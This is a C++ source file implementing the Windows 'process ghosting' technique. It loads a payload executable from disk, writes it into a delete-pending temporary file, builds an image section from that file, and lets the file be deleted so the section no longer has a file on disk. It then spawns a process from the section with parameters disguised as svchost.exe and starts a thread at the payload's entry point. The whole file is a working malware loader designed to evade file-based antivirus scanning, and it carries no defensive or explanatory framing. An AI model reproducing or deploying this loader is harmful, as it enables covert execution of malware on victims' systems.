#include <stdio.h>
#include <Windows.h>
#include <iostream>

// =============================================================================
// SECTION 1: Defines & Macros (from CWLInc.h)
// =============================================================================

#ifndef _APISETMAP_H_
#define _APISETMAP_H_
#endif

#define STATUS_IMAGE_NOT_AT_BASE        0x40000003
#define DEREF( name )                   *(UINT_PTR *)(name)
#define DEREF_64( name )                *(DWORD64 *)(name)
#define DEREF_32( name )                *(DWORD *)(name)
#define DEREF_16( name )                *(WORD *)(name)
#define DEREF_8( name )                 *(BYTE *)(name)
#define NtCurrentProcess()              ( (HANDLE)(LONG_PTR) -1 )
#define PS_INHERIT_HANDLES              4
#define NT_SUCCESS(Status)              ((NTSTATUS)(Status) == STATUS_SUCCESS)
#define STATUS_SUCCESS                  0
#define OBJ_CASE_INSENSITIVE            0x00000040L
#define FILE_OVERWRITE_IF               0x00000005
#define FILE_SYNCHRONOUS_IO_NONALERT    0x00000020
#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001
#define RTL_MAX_DRIVE_LETTERS           32

#ifndef FILE_SUPERSEDED
#define FILE_SUPERSEDED                 0x00000000
#define FILE_OPENED                     0x00000001
#define FILE_CREATED                    0x00000002
#define FILE_OVERWRITTEN                0x00000003
#define FILE_EXISTS                     0x00000004
#define FILE_DOES_NOT_EXIST             0x00000005
#endif

#define InitializeObjectAttributes( i, o, a, r, s ) {    \
      (i)->Length = sizeof( OBJECT_ATTRIBUTES );          \
      (i)->RootDirectory = r;                             \
      (i)->Attributes = a;                                \
      (i)->ObjectName = o;                                \
      (i)->SecurityDescriptor = s;                        \
      (i)->SecurityQualityOfService = NULL;               \
   }

// =============================================================================
// SECTION 2: Type Definitions & Structures (from CWLInc.h)
// =============================================================================

typedef LONG    KPRIORITY;
typedef long    NTSTATUS;

typedef struct {
    WORD offset : 12;
    WORD type   : 4;
} IMAGE_RELOC, *PIMAGE_RELOC;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  pBuffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef const UNICODE_STRING* PCUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _IO_STATUS_BLOCK {
    union {
        LONG  Status;
        PVOID Pointer;
    };
    ULONG Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type   : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

// PEB structures
typedef struct _PEB_LDR_DATA {
    BYTE  Reserved1[8];
    PVOID Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _RTL_DRIVE_LETTER_CURDIR {
    USHORT         Flags;
    USHORT         Length;
    ULONG          TimeStamp;
    UNICODE_STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

typedef struct _CURDIR {
    UNICODE_STRING DosPath;
    HANDLE         Handle;
} CURDIR, *PCURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    ULONG MaximumLength;
    ULONG Length;
    ULONG Flags;
    ULONG DebugFlags;
    HANDLE ConsoleHandle;
    ULONG  ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;
    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;
    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;
    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];
    ULONG EnvironmentSize;
    ULONG EnvironmentVersion;
    PVOID PackageDependencyData;
    ULONG ProcessGroupId;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef VOID (NTAPI* PPS_POST_PROCESS_INIT_ROUTINE)(VOID);

typedef struct _PEB_FREE_BLOCK {
    _PEB_FREE_BLOCK* Next;
    ULONG            Size;
} PEB_FREE_BLOCK, *PPEB_FREE_BLOCK;

typedef void (*PPEBLOCKROUTINE)(PVOID PebLock);

typedef struct _PEB {
    BOOLEAN  InheritedAddressSpace;
    BOOLEAN  ReadImageFileExecOptions;
    BOOLEAN  BeingDebugged;
    BOOLEAN  Spare;
    HANDLE   Mutant;
    PVOID    ImageBaseAddress;
    PPEB_LDR_DATA LoaderData;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID    SubSystemData;
    PVOID    ProcessHeap;
    PVOID    FastPebLock;
    PPEBLOCKROUTINE FastPebLockRoutine;
    PPEBLOCKROUTINE FastPebUnlockRoutine;
    ULONG    EnvironmentUpdateCount;
    PVOID*   KernelCallbackTable;
    PVOID    EventLogSection;
    PVOID    EventLog;
    PPEB_FREE_BLOCK FreeList;
    ULONG    TlsExpansionCounter;
    PVOID    TlsBitmap;
    ULONG    TlsBitmapBits[0x2];
    PVOID    ReadOnlySharedMemoryBase;
    PVOID    ReadOnlySharedMemoryHeap;
    PVOID*   ReadOnlyStaticServerData;
    PVOID    AnsiCodePageData;
    PVOID    OemCodePageData;
    PVOID    UnicodeCaseTableData;
    ULONG    NumberOfProcessors;
    ULONG    NtGlobalFlag;
    BYTE     Spare2[0x4];
    LARGE_INTEGER CriticalSectionTimeout;
    ULONG    HeapSegmentReserve;
    ULONG    HeapSegmentCommit;
    ULONG    HeapDeCommitTotalFreeThreshold;
    ULONG    HeapDeCommitFreeBlockThreshold;
    ULONG    NumberOfHeaps;
    ULONG    MaximumNumberOfHeaps;
    PVOID**  ProcessHeaps;
    PVOID    GdiSharedHandleTable;
    PVOID    ProcessStarterHelper;
    PVOID    GdiDCAttributeList;
    PVOID    LoaderLock;
    ULONG    OSMajorVersion;
    ULONG    OSMinorVersion;
    ULONG    OSBuildNumber;
    ULONG    OSPlatformId;
    ULONG    ImageSubSystem;
    ULONG    ImageSubSystemMajorVersion;
    ULONG    ImageSubSystemMinorVersion;
    ULONG    GdiHandleBuffer[0x22];
    ULONG    PostProcessInitRoutine;
    ULONG    TlsExpansionBitmap;
    BYTE     TlsExpansionBitmapBits[0x80];
    ULONG    SessionId;
} PEB, *PPEB;

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID     Reserved1;
    PPEB      PebBaseAddress;
    PVOID     Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID     Reserved3;
} PROCESS_BASIC_INFORMATION;

typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation    = 0,
    ProcessDebugPort           = 7,
    ProcessWow64Information    = 26,
    ProcessImageFileName       = 27,
    ProcessBreakOnTermination  = 29
} PROCESSINFOCLASS;

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;

typedef enum _FILE_INFORMATION_CLASS {
    FileDirectoryInformation         = 1,
    FileFullDirectoryInformation,    // 2
    FileBothDirectoryInformation,    // 3
    FileBasicInformation,            // 4
    FileStandardInformation,         // 5
    FileInternalInformation,         // 6
    FileEaInformation,               // 7
    FileAccessInformation,           // 8
    FileNameInformation,             // 9
    FileRenameInformation,           // 10
    FileLinkInformation,             // 11
    FileNamesInformation,            // 12
    FileDispositionInformation,      // 13
    FilePositionInformation,         // 14
    FileFullEaInformation,           // 15
    FileModeInformation,             // 16
    FileAlignmentInformation,        // 17
    FileAllInformation,              // 18
    FileAllocationInformation,       // 19
    FileEndOfFileInformation,        // 20
    FileAlternateNameInformation,    // 21
    FileStreamInformation,           // 22
    FilePipeInformation,             // 23
    FilePipeLocalInformation,        // 24
    FilePipeRemoteInformation,       // 25
    FileMailslotQueryInformation,    // 26
    FileMailslotSetInformation,      // 27
    FileCompressionInformation,      // 28
    FileObjectIdInformation,         // 29
    FileCompletionInformation,       // 30
    FileMoveClusterInformation,      // 31
    FileQuotaInformation,            // 32
    FileReparsePointInformation,     // 33
    FileNetworkOpenInformation,      // 34
    FileAttributeTagInformation,     // 35
    FileTrackingInformation,         // 36
    FileIdBothDirectoryInformation,  // 37
    FileIdFullDirectoryInformation,  // 38
    FileValidDataLengthInformation,  // 39
    FileShortNameInformation,        // 40
    FileMaximumInformation           // 41
} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;

typedef struct _FILE_DISPOSITION_INFORMATION {
    BOOLEAN DeleteFile;
} FILE_DISPOSITION_INFORMATION, *PFILE_DISPOSITION_INFORMATION;

// =============================================================================
// SECTION 3: NT API Function Pointer Typedefs (from CWLInc.h)
// =============================================================================

typedef void (WINAPI* _RtlInitUnicodeString)(
    PUNICODE_STRING DestinationString,
    PCWSTR          SourceString);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtOpenFile)(
    OUT PHANDLE             FileHandle,
    IN  ACCESS_MASK         DesiredAccess,
    IN  POBJECT_ATTRIBUTES  ObjectAttributes,
    OUT PIO_STATUS_BLOCK    IoStatusBlock,
    IN  ULONG               ShareAccess,
    IN  ULONG               OpenOptions);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtSetInformationFile)(
    IN  HANDLE                  FileHandle,
    OUT PIO_STATUS_BLOCK        IoStatusBlock,
    IN  PVOID                   FileInformation,
    IN  ULONG                   Length,
    IN  FILE_INFORMATION_CLASS  FileInformationClass);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateSection)(
    PHANDLE             SectionHandle,
    ACCESS_MASK         DesiredAccess,
    POBJECT_ATTRIBUTES  ObjectAttributes,
    PLARGE_INTEGER      MaximumSize,
    ULONG               SectionPageProtection,
    ULONG               AllocationAttributes,
    HANDLE              FileHandle);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateProcessEx)(
    PHANDLE             ProcessHandle,
    ACCESS_MASK         DesiredAccess,
    POBJECT_ATTRIBUTES  ObjectAttributes  OPTIONAL,
    HANDLE              ParentProcess,
    ULONG               Flags,
    HANDLE              SectionHandle     OPTIONAL,
    HANDLE              DebugPort         OPTIONAL,
    HANDLE              ExceptionPort     OPTIONAL,
    BOOLEAN             InJob);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtQueryInformationProcess)(
    IN  HANDLE          ProcessHandle,
    IN  PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID           ProcessInformation,
    IN  ULONG           ProcessInformationLength,
    OUT PULONG          ReturnLength OPTIONAL);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtReadVirtualMemory)(
    _In_        HANDLE  ProcessHandle,
    _In_opt_    PVOID   BaseAddress,
    _Out_       PVOID   Buffer,
    _In_        SIZE_T  BufferSize,
    _Out_opt_   PSIZE_T NumberOfBytesRead);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtWriteVirtualMemory)(
    _In_        HANDLE  ProcessHandle,
    _In_opt_    PVOID   BaseAddress,
    _In_        VOID*   Buffer,
    _In_        SIZE_T  BufferSize,
    _Out_opt_   PSIZE_T NumberOfBytesWritten);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(
    HANDLE      ProcessHandle,
    PVOID*      BaseAddress,
    ULONG_PTR   ZeroBits,
    PSIZE_T     RegionSize,
    ULONG       AllocationType,
    ULONG       Protect);

typedef NTSYSAPI PIMAGE_NT_HEADERS(NTAPI* _RtlImageNTHeader)(
    _In_ PVOID Base);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateThreadEx)(
    _Out_ PHANDLE               hThread,
    _In_  ACCESS_MASK           DesiredAccess,
    _In_  LPVOID                ObjectAttributes,
    _In_  HANDLE                ProcessHandle,
    _In_  LPTHREAD_START_ROUTINE lpStartAddress,
    _In_  LPVOID                lpParameter,
    _In_  BOOL                  CreateSuspended,
    _In_  DWORD                 StackZeroBits,
    _In_  DWORD                 SizeOfStackCommit,
    _In_  DWORD                 SizeOfStackReserve,
    _Out_ LPVOID                lpBytesBuffer);

typedef NTSYSAPI NTSTATUS(NTAPI* _RtlCreateProcessParametersEx)(
    _Out_ PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
    _In_  PUNICODE_STRING ImagePathName,
    _In_opt_ PUNICODE_STRING DllPath,
    _In_opt_ PUNICODE_STRING CurrentDirectory,
    _In_opt_ PUNICODE_STRING CommandLine,
    _In_opt_ PVOID           Environment,
    _In_opt_ PUNICODE_STRING WindowTitle,
    _In_opt_ PUNICODE_STRING DesktopInfo,
    _In_opt_ PUNICODE_STRING ShellInfo,
    _In_opt_ PUNICODE_STRING RuntimeData,
    _In_     ULONG           Flags);

// =============================================================================
// SECTION 4: Helper Macro for resolving NT APIs
// =============================================================================

#define RESOLVE_API(type, var, dll, name)                                          \
    type var = (type)GetProcAddress(GetModuleHandleA(dll), name);                  \
    if (var == NULL) { printf("[-] Failed to resolve %s\n", name); exit(-1); }

// =============================================================================
// SECTION 5: Implementation (from CWLImplant.cpp)
// =============================================================================

// -----------------------------------------------------------------------------
// Step 1: Read payload from disk into a local buffer
// -----------------------------------------------------------------------------
BYTE* GetPayloadBuffer(OUT size_t& p_size) {
    HANDLE hFile = CreateFileW(
        L"C:\\temp\\payload64.exe",
        GENERIC_READ, 0, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

    if (hFile == INVALID_HANDLE_VALUE) {
        perror("[-] Unable to open payload file\n");
        exit(-1);
    }

    p_size = GetFileSize(hFile, 0);
    BYTE* buf = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) { perror("[-] VirtualAlloc failed for payload\n"); exit(-1); }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, buf, (DWORD)p_size, &bytesRead, NULL)) {
        perror("[-] ReadFile failed\n");
        exit(-1);
    }

    CloseHandle(hFile);
    return buf;
}

// -----------------------------------------------------------------------------
// Step 2: Create a file-less image section from a delete-pending file
// -----------------------------------------------------------------------------
HANDLE MakeSectionFromDeletePendingFile(wchar_t* ntFilePath, BYTE* payload, size_t payloadSize) {
    HANDLE           hFile    = NULL;
    HANDLE           hSection = NULL;
    NTSTATUS         status;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING   uFileName;
    IO_STATUS_BLOCK  statusBlock = { 0 };
    DWORD            bytesWritten;

    RESOLVE_API(_RtlInitUnicodeString,   pRtlInitUnicodeString,   "ntdll.dll", "RtlInitUnicodeString")
    RESOLVE_API(_NtOpenFile,             pNtOpenFile,             "ntdll.dll", "NtOpenFile")
    RESOLVE_API(_NtSetInformationFile,   pNtSetInformationFile,   "ntdll.dll", "NtSetInformationFile")
    RESOLVE_API(_NtCreateSection,        pNtCreateSection,        "ntdll.dll", "NtCreateSection")

    // Build NT-style path and open/create the file
    pRtlInitUnicodeString(&uFileName, ntFilePath);
    InitializeObjectAttributes(&objAttr, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    wprintf(L"[+] Opening file: %s\n", ntFilePath);
    status = pNtOpenFile(
        &hFile,
        GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
        &objAttr, &statusBlock,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_SUPERSEDED | FILE_SYNCHRONOUS_IO_NONALERT);

    if (!NT_SUCCESS(status)) {
        printf("[-] NtOpenFile failed: 0x%x\n", status);
        exit(-1);
    }

    // Mark file delete-pending — other processes now cannot open it
    wprintf(L"[+] Setting file to delete-pending state...\n");
    FILE_DISPOSITION_INFORMATION fdi = { TRUE };
    status = pNtSetInformationFile(hFile, &statusBlock, &fdi, sizeof(fdi), FileDispositionInformation);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtSetInformationFile failed: 0x%x\n", status);
        exit(-1);
    }

    // Write payload into the delete-pending file
    wprintf(L"[+] Writing payload into delete-pending file...\n");
    if (!WriteFile(hFile, payload, (DWORD)payloadSize, &bytesWritten, NULL)) {
        perror("[-] WriteFile failed\n");
        exit(-1);
    }

    // Create image section BEFORE closing the handle
    wprintf(L"[+] Creating image section from delete-pending file...\n");
    status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0,
                              PAGE_READONLY, SEC_IMAGE, hFile);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtCreateSection failed: 0x%x\n", status);
        exit(-1);
    }
    wprintf(L"[+] Section created successfully.\n");

    // Closing the handle deletes the file — section persists as file-less
    CloseHandle(hFile);
    hFile = NULL;
    wprintf(L"[+] File deleted. Section is now file-less.\n");

    return hSection;
}

// -----------------------------------------------------------------------------
// Step 3: Create a process body from the file-less section
// -----------------------------------------------------------------------------
HANDLE CreateProcessWithSection(HANDLE hSection) {
    HANDLE   hProcess = INVALID_HANDLE_VALUE;
    NTSTATUS status;

    RESOLVE_API(_NtCreateProcessEx, pNtCreateProcessEx, "ntdll.dll", "NtCreateProcessEx")

    status = pNtCreateProcessEx(
        &hProcess, PROCESS_ALL_ACCESS, NULL,
        GetCurrentProcess(), PS_INHERIT_HANDLES,
        hSection, NULL, NULL, FALSE);

    if (!NT_SUCCESS(status)) {
        printf("[-] NtCreateProcessEx failed: 0x%x\n", status);
        exit(-1);
    }
    return hProcess;
}

// -----------------------------------------------------------------------------
// Step 4: Find the payload entry point in the remote process
// -----------------------------------------------------------------------------
ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE* payload, PROCESS_BASIC_INFORMATION pbi) {
    BYTE     image[0x1000];
    SIZE_T   bytesRead;
    NTSTATUS status;

    ZeroMemory(image, sizeof(image));

    RESOLVE_API(_RtlImageNTHeader,       pRtlImageNTHeader,       "ntdll.dll", "RtlImageNtHeader")
    RESOLVE_API(_NtReadVirtualMemory,    pNtReadVirtualMemory,    "ntdll.dll", "NtReadVirtualMemory")

    // Read the remote PEB to obtain ImageBaseAddress
    status = pNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &image, sizeof(image), &bytesRead);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtReadVirtualMemory (PEB) failed: 0x%x\n", status);
        exit(-1);
    }

    ULONG_PTR remoteImageBase = (ULONG_PTR)((PPEB)image)->ImageBaseAddress;
    wprintf(L"[+] Remote image base: 0x%p\n", (PVOID)remoteImageBase);

    // Entry point = remote base + RVA from local payload headers
    ULONG_PTR epRVA       = pRtlImageNTHeader(payload)->OptionalHeader.AddressOfEntryPoint;
    ULONG_PTR entryPoint  = remoteImageBase + epRVA;
    wprintf(L"[+] Entry point: 0x%p\n", (PVOID)entryPoint);

    return entryPoint;
}

// -----------------------------------------------------------------------------
// Main orchestrator
// -----------------------------------------------------------------------------
BOOL ProcessGhosting(BYTE* payload, size_t payloadSize) {
    NTSTATUS                    status;
    HANDLE                      hProcess  = INVALID_HANDLE_VALUE;
    HANDLE                      hSection  = INVALID_HANDLE_VALUE;
    HANDLE                      hThread   = NULL;
    DWORD                       returnLength;
    PROCESS_BASIC_INFORMATION   pbi;
    ULONG_PTR                   entryPoint;
    UNICODE_STRING              uTargetFile, uDllPath;
    PRTL_USER_PROCESS_PARAMETERS processParameters = NULL;

    // Resolve APIs needed in this scope
    RESOLVE_API(_NtQueryInformationProcess,   pNtQueryInformationProcess,   "ntdll.dll", "NtQueryInformationProcess")
    RESOLVE_API(_RtlInitUnicodeString,        pRtlInitUnicodeString,        "ntdll.dll", "RtlInitUnicodeString")
    RESOLVE_API(_RtlCreateProcessParametersEx,pRtlCreateProcessParametersEx,"ntdll.dll", "RtlCreateProcessParametersEx")
    RESOLVE_API(_NtAllocateVirtualMemory,     pNtAllocateVirtualMemory,     "ntdll.dll", "NtAllocateVirtualMemory")
    RESOLVE_API(_NtWriteVirtualMemory,        pNtWriteVirtualMemory,        "ntdll.dll", "NtWriteVirtualMemory")
    RESOLVE_API(_NtCreateThreadEx,            pNtCreateThreadEx,            "ntdll.dll", "NtCreateThreadEx")

    // --- Build NT path for temp file ---
    wchar_t ntPath[MAX_PATH]      = L"\\??\\";
    wchar_t tempFileName[MAX_PATH] = { 0 };
    wchar_t tempPath[MAX_PATH]     = { 0 };
    GetTempPathW(MAX_PATH, tempPath);
    GetTempFileNameW(tempPath, L"PG", 0, tempFileName);
    lstrcat(ntPath, tempFileName);

    // --- Phase 1: Create file-less section ---
    hSection = MakeSectionFromDeletePendingFile(ntPath, payload, payloadSize);
    if (hSection == INVALID_HANDLE_VALUE) {
        perror("[-] Invalid section handle\n");
        exit(-1);
    }

    // --- Phase 2: Create process body ---
    hProcess = CreateProcessWithSection(hSection);
    if (hProcess == INVALID_HANDLE_VALUE) {
        perror("[-] Invalid process handle\n");
        exit(-1);
    }
    wprintf(L"[+] Process body created from file-less section.\n");

    // --- Phase 3: Query PBI / get entry point ---
    status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation,
                                        &pbi, sizeof(pbi), &returnLength);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtQueryInformationProcess failed: 0x%x\n", status);
        exit(-1);
    }
    entryPoint = GetEntryPoint(hProcess, payload, pbi);

    // --- Phase 4: Set up process parameters ---
    wchar_t targetPath[] = L"C:\\Windows\\System32\\svchost.exe";
    wchar_t dllDir[]     = L"C:\\Windows\\System32";
    pRtlInitUnicodeString(&uTargetFile, targetPath);
    pRtlInitUnicodeString(&uDllPath,    dllDir);

    status = pRtlCreateProcessParametersEx(
        &processParameters, &uTargetFile, &uDllPath,
        NULL, &uTargetFile, NULL, NULL, NULL, NULL, NULL,
        RTL_USER_PROC_PARAMS_NORMALIZED);
    if (!NT_SUCCESS(status)) {
        printf("[-] RtlCreateProcessParametersEx failed: 0x%x\n", status);
        exit(-1);
    }

    // Allocate space for parameters in the remote process
    PVOID  paramBuffer = processParameters;
    SIZE_T paramSize   = processParameters->EnvironmentSize + processParameters->MaximumLength;

    status = pNtAllocateVirtualMemory(hProcess, &paramBuffer, 0, &paramSize,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtAllocateVirtualMemory (params) failed: 0x%x\n", status);
        exit(-1);
    }
    printf("[+] Parameter buffer allocated at: %p\n", paramBuffer);

    // Write parameters into the remote process
    status = pNtWriteVirtualMemory(hProcess, processParameters, processParameters,
                                   processParameters->EnvironmentSize +
                                   processParameters->MaximumLength, NULL);

    // Point remote PEB->ProcessParameters at our written buffer
    PEB* remotePEB = (PEB*)pbi.PebBaseAddress;
    if (!WriteProcessMemory(hProcess, &remotePEB->ProcessParameters,
                            &processParameters, sizeof(PVOID), NULL)) {
        perror("[-] WriteProcessMemory (PEB params) failed\n");
        exit(-1);
    }
    printf("[+] Remote PEB->ProcessParameters updated.\n");

    // --- Phase 5: Create thread and execute ---
    status = pNtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, NULL, hProcess,
        (LPTHREAD_START_ROUTINE)entryPoint,
        NULL, FALSE, 0, 0, 0, NULL);

    if (!NT_SUCCESS(status)) {
        printf("[-] NtCreateThreadEx failed: 0x%x\n", (UINT)status);
        exit(-1);
    }
    printf("[+] Thread created. Payload executing.\n");

    return TRUE;
}

// =============================================================================
// SECTION 6: Entry Point
// =============================================================================

int main() {
    size_t payloadSize  = 0;
    BYTE*  payloadBuffer = GetPayloadBuffer(payloadSize);
    ProcessGhosting(payloadBuffer, payloadSize);
    system("pause");
    return 0;
}
